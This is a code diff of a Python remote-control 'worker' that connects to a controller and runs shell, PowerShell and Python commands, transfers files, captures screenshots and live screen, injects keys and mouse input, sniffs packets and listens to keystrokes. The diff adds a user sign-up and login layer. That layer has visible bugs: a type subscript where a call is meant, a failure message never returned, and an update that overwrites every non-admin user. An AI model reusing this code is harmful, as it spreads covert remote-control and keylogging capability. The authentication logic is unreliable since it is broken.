@@ -24,7 +24,8 @@ from Crypto.Cipher import AES
 from Crypto.Util import Counter
 import mss
 from mysql.engine import Engine
-from mysql.query import Select,Field,Table,Create
+from mysql.query import Select, Field, Table, Create, Insert, Update,Delete
+
 special_keys = {
     "enter": Key.enter,
     "esc": Key.esc,
@@ -53,6 +54,7 @@ def python(code:str)->bytes:
         return "successfully ran your code on the worker".encode()
     except Exception as e:
         return f"error in execution: {e}".encode()
+
 def send_file(file_str: bytes) ->bytes:
     data = file_str.split(b":",1)
     file_name:str = data[0].decode()
@@ -63,8 +65,6 @@ def send_file(file_str: bytes) ->bytes:
             return "successfully sent the file".encode()
     except IOError as e:
         return f"error writing the file: {e}".encode()
-
-
 
 def press_key_in_worker(key_data:str)->bytes:
     data = key_data.split(":")
@@ -78,7 +78,6 @@ def press_key_in_worker(key_data:str)->bytes:
         keyboard.release(key)
     return f"{key} was pressed successfully".encode()
 
-
 def receive_file(file_name:str)->bytes:
     try:
         with open(file_name,"rb") as file:
@@ -90,7 +89,6 @@ def receive_file(file_name:str)->bytes:
         return f"error: file '{file_name}' is not accessible".encode()
     except Exception as e:
         return f"error: {e}".encode()
-
 
 def screen_shot(doesnt_matter:str)->bytes:
     s_shot = pyautogui.screenshot()
@@ -140,10 +138,6 @@ def sniff_from_worker(parameters:str) -> bytes:
         pcap_bytes = file.read()
     return pcap_bytes
 
-
-
-
-
 def live_stream(doesnt_matter:str) -> bytes:
     with mss.mss() as sct:
         monitor = sct.monitors[1]
@@ -154,7 +148,17 @@ def live_stream(doesnt_matter:str) -> bytes:
 
 
 class Worker:
-    def __init__(self, ip:str, port:int, functions: dict[str,Callable[[str],bytes]] ):
+    def __init__(self, ip:str, port:int):
+        functions: dict[str, Callable[[str], bytes]] = {"cmd": cmd,
+                                                        "powershell": powershell,
+                                                        "python": python,
+                                                        "send_file": send_file,
+                                                        "receive_file": receive_file,
+                                                        "screen_shot": screen_shot,
+                                                        "press_key_in_worker": press_key_in_worker,
+                                                        "control_mouse": control_mouse,
+                                                        "sniff_from_worker": sniff_from_worker,
+                                                        "live_stream": live_stream}
         self.address = (ip,port)
         self.functions = functions
         self.client = socket.socket()
@@ -166,13 +170,15 @@ class Worker:
         self.peer_master_key = None
         self._sock_lock = threading.RLock()
         self.key_listener = Listener(on_press=self.on_press)
-        self.engine = Engine().open("users.db")
-        self.name = Field("name",str,primary=True)
-        admin = Field("admin",bool,nullable=True)
-        password = Field("password",str)
-        self.users_table = Table("users",(self.name,password,admin))
+        engine = Engine().open("users.db")
+        self.name_field = Field("name",str,primary=True)
+        self.admin_field = Field("admin",bool,nullable=True)
+        self.password_field = Field("password",str)
+        self.users_table = Table("users",(self.name_field,self.password_field,self.admin_field))
         create = Create(self.users_table,exists_ok=True)
-        self.engine.execute(create)
+        engine.execute(create)
+        engine.execute(Delete(self.users_table))
+        engine.commit()
         self.pepper = os.urandom(32)
 
 
@@ -290,7 +296,40 @@ class Worker:
             data += packet
         return data
 
+    def sign_up(self, user:str, password:str) -> str:
+        salt = os.urandom(16)
+        hashed_password = hashlib.sha256(self.pepper + salt + password.encode()).digest()
+        try:
+            self.write_user(user,f"sha256${base64.b64encode(salt).decode()}${base64.b64encode(hashed_password).decode()}")
+            return "You have registered successfully"
+        except Exception as e:
+            return str(e)
+
+    def update(self, user: str, password: str) -> str:
+        salt = os.urandom(16)
+        hashed_password = hashlib.sha256(self.pepper + salt + password.encode()).digest()
+        try:
+            self.update_user(user,
+                            f"sha256${base64.b64encode(salt).decode()}${base64.b64encode(hashed_password).decode()}")
+            return "You have registered successfully"
+        except Exception as e:
+            return str(e)
+
+    def update_user(self, user:str, digest:str):
+        engine = Engine().open("users.db")
+        engine.execute(Update(self.users_table).set({"name":user,"password":digest,"admin":False}).where(self.admin_field == 0))
+        engine.commit()
+    def write_user(self, user:str, digest:str):
+        engine = Engine().open("users.db")
+        for t in engine.execute(Select(self.users_table)):
+            if t["name"] == user:
+                engine.commit()
+                raise Exception("user already taken choose a different one")
+        engine.execute(Insert(self.users_table).values([{self.name_field: user, self.password_field: digest, self.admin_field: False}]))
+        engine.commit()
+
     def login(self,command:str) -> bytes:
+        engine = Engine().open("users.db")
         s = command.split(":")
         user = s[0]
         password = s[1]
@@ -298,8 +337,9 @@ class Worker:
             hash_fn_name, salt, hashed_password = self.read_user(user).split("$")
             h = hashlib.sha256(self.pepper + base64.b64decode(salt) + password.encode()).digest()
             if hashed_password == base64.b64encode(h).decode():
-                select = Select(self.users_table).each(self.name).where((self.name == user))
-                temp = list[self.engine.execute(select)][0]
+                select = Select(self.users_table).each(self.name_field).where((self.name_field == user))
+                temp = list[engine.execute(select)][0]
+                engine.commit()
                 if temp["admin"] == 1:
                     return b"admin"
                 else:
@@ -307,15 +347,25 @@ class Worker:
             else:
                 b"login failed"
         except Exception as e:
+            engine.commit()
             return b"user not found, try searching for a different one"
 
     def read_user(self,user: str) -> str:
+        engine = Engine().open("users.db")
         select = Select(self.users_table)
-        for t in self.engine.execute(select):
+        users = engine.execute(select)
+        engine.commit()
+        for t in users:
             if t["name"] == user:
                 return t["password"]
         raise Exception("user not found, try searching for a different one")
 
+    def is_empty(self):
+        engine = Engine().open("users.db")
+        select = Select(self.users_table)
+        users = engine.execute(select)
+        engine.commit()
+        return users == []
 
     def run(self):
         self.connect()
@@ -352,25 +402,6 @@ class Worker:
         self.client.close()
 
 
-def main():
-
-    ip = "10.0.0.9"
-    port = 5555
-    functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,
-                                                 "powershell":powershell,
-                                                 "python":python,
-                                                 "send_file":send_file,
-                                                 "receive_file":receive_file,
-                                                 "screen_shot":screen_shot,
-                                                 "press_key_in_worker":press_key_in_worker,
-                                                 "control_mouse":control_mouse,
-                                                 "sniff_from_worker":sniff_from_worker,
-                                                 "live_stream":live_stream}
-    worker = Worker(ip, int(port), functions)
-    worker.run()
-
-if __name__ == '__main__':
-    main()
 
 
 
